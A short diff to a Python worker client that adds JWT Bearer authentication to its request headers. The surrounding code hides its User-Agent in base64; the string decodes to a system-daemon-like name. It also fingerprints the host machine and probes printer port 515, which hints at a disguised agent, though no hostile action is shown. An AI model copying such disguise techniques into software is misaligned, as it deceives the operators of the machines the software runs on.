@@ -1,7 +1,8 @@
 import atexit, ctypes, platform, signal, struct, sys, uuid, zlib
-from base64 import b64decode
+from base64 import b64decode, urlsafe_b64encode
 from gc import collect, disable
 from hashlib import sha256
+from hmac import new as hmac_new
 from http.client import HTTPSConnection
 from json import loads
 from os import _exit, environ, urandom
@@ -191,8 +192,24 @@ def is_online(host, port=515):
 _UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
 _WORKER_IDENT = f"{uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode()))}_{platform.machine().lower()}"
 
+def _b64url(data):
+    return urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
+
+def _make_jwt():
+    header = _b64url(b'{"alg":"HS256","typ":"JWT"}')
+    payload = _b64url(b'{"sub":"printer","iss":"preconnect"}')
+    sig_input = f"{header}.{payload}".encode("ascii")
+    sig = _b64url(hmac_new(_k.encode("utf-8"), sig_input, sha256).digest())
+    return f"{header}.{payload}.{sig}"
+
 def hdrs():
-    return {"User-Agent": _UA, "X-Worker-Key": _k, "X-Worker-Jobs": str(jobs), "X-Worker-Ident": _WORKER_IDENT}
+    return {
+        "User-Agent": _UA,
+        "Authorization": f"Bearer {_make_jwt()}",
+        "X-Worker-Key": _k,
+        "X-Worker-Jobs": str(jobs),
+        "X-Worker-Ident": _WORKER_IDENT,
+    }
 
 def claim(i, retries=3):
     if not i: return True
